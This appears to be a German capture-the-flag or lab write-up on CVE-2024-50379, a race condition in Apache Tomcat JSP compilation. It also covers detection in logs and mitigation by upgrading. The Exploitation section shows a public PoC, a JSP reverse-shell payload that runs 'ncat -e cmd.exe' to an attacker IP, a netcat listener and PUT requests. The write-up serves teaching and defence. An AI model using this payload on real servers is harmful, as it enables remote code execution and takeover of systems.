Apache Tomcat ist ein Open-Source-Webserver und Servlet-Container. Falls dieser Begriff dir unbekannt ist: Ein Servlet ist eine Java-Klasse, die für die Ausführung auf einem Anwendungsserver und die Bearbeitung von Client-Anfragen erstellt wurde. Es empfängt die HTTP-Anfrage des Clients, verarbeitet sie und generiert die entsprechende Antwort. Ein Servlet-Container stellt die Laufzeitumgebung für die Java-Servlets bereit und verwaltet deren Lebenszyklus.

CVE-2024-50379 ist ein Beispiel für eine TOCTOU-Sicherheitslücke (Time-of-check Time-of-use). Eine TOCTOU-Sicherheitslücke entsteht durch eine Race Condition zwischen der Überprüfung einer Ressource und ihrer Verwendung. Mit anderen Worten: Nachdem ein System den Status einer Ressource überprüft hat und bevor es diese verwendet, ändert sich die Ressource, und das System verwendet schließlich die geänderte Ressource. Bei dieser Sicherheitslücke entsteht die TOCTOU-Race Condition während der JSP-Kompilierung (Java Server Page) auf Systemen, die nicht zwischen Groß- und Kleinschreibung unterscheiden, vorausgesetzt, das Standard-Servlet verfügt über Schreibrechte.


# Technischer Hintergrund

Es gibt 2 Vorraussetzungen damit die TOCTOU Schwachstelle Funktionieren kann. 

1. Der Server muss es erlauben das Datein gelöscht werden. 
	1. Beispiel:  Der Server ist so Konfiguriert, dass er HTTP Befehle wie PUT und DELETE akzeptiert. Schreiben wird eingeschaltet indem man die option `readonly` zu `false` in der `web.xml` Config Datei setzt. (Bei Default ist die Config auf Readonly gesetzt) Siehe hier: 

```xml
<init-param>
  <param-name>readonly</param-name>
  <param-value>false</param-value>
</init-param>
``` 

Beispiel für eine Unsichere Config, in welcher der Anwendungsserver bei Default Schreibzugriff gewährt:

```
<servlet>
  <servlet-name>default</servlet-name>
  <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
  <init-param>
    <param-name>debug</param-name>
    <param-value>0</param-value>
  </init-param>
  <init-param>
    <param-name>listings</param-name>
    <param-value>false</param-value>
  </init-param>
  <init-param>
    <param-name>readonly</param-name>
    <param-value>false</param-value>
  </init-param>
  <load-on-startup>1</load-on-startup>
</servlet>
```

2. Die Zweite vorraussetzung ist, dass Tomcat auf einem System läuft, das nicht zwischen Groß- und Kleinschreibung unterscheidet, wie beispielsweise MS Windows oder macOS. Wenn diese beiden Bedingungen erfüllt sind, ist die Ausnutzung dieser Schwachstelle eine Frage des Wettlaufs mit dem Betriebssystem.

Bei Linux ist das anders, da hier die Datein `demo.jsp` und `demo.Jsp` zwei unterschiedliche Datein darstellen. Da Windows nicht zwischen Groß- und Kleinschreibung unterscheidet, können demo.jsp und demo.Jsp keine zwei verschiedenen Dateien sein. Für Tomcat ist jedoch die erstere eine ausführbare Servlet-Datei, während die letztere als Textdatei behandelt wird. Mit anderen Worten: Windows würde demo.Jsp genauso behandeln wie ein Servlet mit dem Namen demo.jsp. Es ist die Groß-/Kleinschreibung von Tomcat, die verhindert, dass demo.Jsp ausgeführt und als ausführbare Datei behandelt wird.


Wenn wir beispielsweise versuchen, die Datei demo.jsp mit `curl -X PUT -d „test“ http://10.10.65.194:8080/demo.jsp` zu erstellen, wird ein Fehler ausgegeben. Dieser Fehler ist zu erwarten, da Servlets Befehle auf der Serverseite ausführen können. Wenn Benutzer also .jsp-Dateien hochladen können, haben sie die Möglichkeit, Remote-Code auszuführen (RCE). Im folgenden Terminal sehen wir ein Beispiel für einen solchen Fehler.

```
curl -X PUT -d "test" http://10.10.65.194:8080/demo.jsp

<!doctype html><html lang="en"><head><title>HTTP Status 404 \u2013 Not Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 \u2013 Not Found</h1><hr class="line" /><p><b>Type</b> Status Report</p><p><b>Message</b> JSP file [&#47;demo.jsp] not found</p><p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p><hr class="line" /><h3>Apache Tomcat/10.1.25</h3></body></html>
```

Erstellen wir eine Datei mit der Erweiterung Jsp oder JSP. Dieser Schritt sollte erfolgreich funktionieren, da Tomcat solche Erweiterungen nicht als ausführbar erkennt. Wir können sehen, dass die Datei demo.Jsp erfolgreich auf dem Server erstellt wurde.

```
root@tryhackme:~# curl -X PUT -d "test" http://10.10.65.194:8080/demo.Jsp 
root@tryhackme:~# curl http://10.10.65.194:8080/demo.Jsp test
```

Wenn wir versuchen, auf demo.Jsp zuzugreifen, wird ein System, das nicht zwischen Groß- und Kleinschreibung unterscheidet, keinen Unterschied zu demo.jsp feststellen, aber Tomcat überprüft die Erweiterung und behandelt sie stattdessen als Textdatei. Es hat sich gezeigt, dass bei hoher Auslastung des Servers eine Race Condition möglich ist. Die Datei demo.Jsp könnte kompiliert und als Servlet ausgeführt werden. Da es sich um ein System handelt, das nicht zwischen Groß- und Kleinschreibung unterscheidet, wurde die Durchsetzung der Einschränkungen für die Servlet-Erweiterung, wie z. B. Jsp und JSP, vom Betriebssystem auf den Anwendungsserver verlagert. Mit anderen Worten: Wenn ein System ausgelastet ist und gleichzeitig auf dieselbe Datei gelesen und geschrieben wird, könnten die Groß-/Kleinschreibungsprüfungen umgangen werden, was dazu führt, dass die hochgeladene Datei als Servlet ausgeführt wird.

# Exploitation

In dem Beispiel nutze ich den Exploit den ich via  `git clone https://github.com/iSee857/CVE-2024-50379-PoC` bekomme 

Wir nehmen zwei Änderungen an diesem Skript vor:

- Ändern des Schleifenzählers: In dieser Laborumgebung haben wir mit der AttackBox und einer Ziel-VM festgestellt, dass es effizienter ist, jede der vier Anfragen 2000 Mal statt 10000 Mal zu wiederholen.
- Ändern der  Payload: Um die Ausnutzung interessanter zu gestalten, verwenden wir eine Reverse-Shell, anstatt den Taschenrechner auf dem Zielsystem zu starten.

die Payload setzen ändern wir auf 

```python
payload_put = "<%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(\"cmd /c start ncat -e cmd.exe 10.10.110.211 8888\"); %>"
```

Da der Einfackeit halber auf dem Zielsystem bereits NCat installiert ist. Diese Payload verwendet JSPs Runtime.getRuntime().exec(), um cmd /c start ncat -e cmd.exe 10.10.110.211 8888 auszuführen. Wie bereits erwähnt, ist dies möglich, weil wir ncat für die Zwecke dieser Demonstration installiert haben.

Um die Shell dann auf dem Angreifer System wieder zu Fangen müssen wir natürlich auch einen Listener aufsetzen das geht via:
```
netcat -lvnp 8888
```

Dann können wir den POC ausführen via: 

```
python3 ApachTomcat_CVE-2024-50379_ConditionalCompetitionToRce.py -u 10.10.65.194:8080
```

Hinweis 1: Wenn Sie diesen Befehl ausführen, wird eine Meldung wie „Checking http://10.10.65.194:8080/...“ angezeigt, und das Terminal zeigt für einige Minuten keine Aktualisierungen mehr an. Während dieser Zeit sendet der Exploit-Code viele Anfragen, um den Zielserver zu überlasten und erfolgreich eine Race Condition zu erzeugen. Bitte warten Sie, während das Skript ausgeführt wird, und beobachten Sie das Terminal, auf dem der Befehl „netcat -lvnp 8888“ ausgeführt wird. Geduld ist hier gefragt.

Hinweis 2: Da es sich um einen Race-Condition-Exploit handelt, müssen Sie den PoC möglicherweise mehrmals wiederholen, bevor er erfolgreich ist.

# Detection

## Web Access Logs

Da die Schwachstelle auf einer erfolgreichen Race Condition beruht und für jeden Ausnutzungsversuch ein Datei-Upload erforderlich ist, lässt sie sich leicht in den Webzugriffsprotokollen erkennen, die standardmäßig in den Dateien `C:\Program Files\Apache Software Foundation\<Tomcat Version>\logs\*access_log*` verfügbar sind. Der einfachste Angriff auf Websites mit uneingeschränktem Datei-Upload wird wie folgt protokolliert:

1. PUT-Anfragen zum Hochladen der Datei mit Großbuchstaben (.Jsp oder .JSP) („PUT /cve.Jsp“)
2. GET-Anfrage an dieselbe Datei unmittelbar danach, nun jedoch mit der Erweiterung .jsp („GET /cve.jsp“)
3. Die GET-Anfrage wird entweder mit dem Statuscode 200 oder 404 protokolliert, je nachdem, ob die Race Condition erfolgreich war oder nicht
4. Die oben genannten Schritte werden wiederholt, bis die Race Condition erfolgreich ist; in der Regel sind dies 1000 oder mehr Versuche

## System Logs
Zusätzlich zu den webbasierten Erkennungen kann der Angriff auf Betriebssystem- und Dateisystemebene mithilfe der standardmäßigen Windows-Ereignisprotokolle oder spezieller Tools wie Sysmon verfolgt werden. Kurz gesagt, die Erkennung kann auf folgenden Elementen basieren:

Dateierstellung: Hochgeladene JSP-Dateien verbleiben im Web-Stammverzeichnis, sofern sie nicht manuell von den Angreifern entfernt werden. Alle JSP-Dateien mit verdächtigen Namen wie „revshell.jsp“ oder unbekannte JSP-Dateien, die Zeichenfolgen wie „.exec()“ enthalten, können auf einen Angriff hindeuten.

# Mitigation

Es ist wichtig zu überprüfen, ob Sie das Schreiben für Servlets aktiviert haben. Wenn die Standardkonfiguration beibehalten wird, d. h. readonly nicht auf false gesetzt ist, sind Sie nicht betroffen. Wenn es auf false gesetzt ist und für Ihren Anwendungsfall nicht erforderlich ist, setzen Sie es wieder auf true zurück.

Die Abhilfemaßnahmen sind in dieser offiziellen Ankündigung beschrieben. Es gibt zwei wichtige Punkte, die Benutzer beachten sollten. Erstens sollten Benutzer ihre Installation von Apache Tomcat aktualisieren. Insbesondere:

- Benutzer von Apache Tomcat 11.0.0-M1 bis 11.0.1 sollten auf 11.0.3 oder höher aktualisieren.
- Benutzer von Apache Tomcat 10.1.0-M1 bis 10.1.33 sollten auf 10.1.35 oder höher aktualisieren.
- Benutzer von Apache Tomcat 9.0.0.M1 bis 9.0.97 sollten auf 9.0.99 oder höher aktualisieren.
- Für Benutzer, die nur auf 11.0.2, 10.1.34 oder 9.98 aktualisiert haben, sind zusätzliche Schritte erforderlich. Insbesondere Benutzer älterer Java-Versionen sollten die entsprechenden expliziten Änderungen vornehmen:

  

Auf Systemen mit Java 8 oder Java 11 sollte die Systemeigenschaft sun.io.useCanonCaches vom Standardwert geändert und auf „false” gesetzt werden.

Auf Systemen mit Java 17 sollte die Systemeigenschaft „sun.io.useCanonCaches“ auf „false“ zurückgesetzt werden, wenn ihr Standardwert geändert wurde.

Es ist zu beachten, dass Tomcat 11.0.3, 10.1.35, 9.0.99 und höher Überprüfungen enthalten, um sicherzustellen, dass „sun.io.useCanonCaches“ richtig eingestellt ist.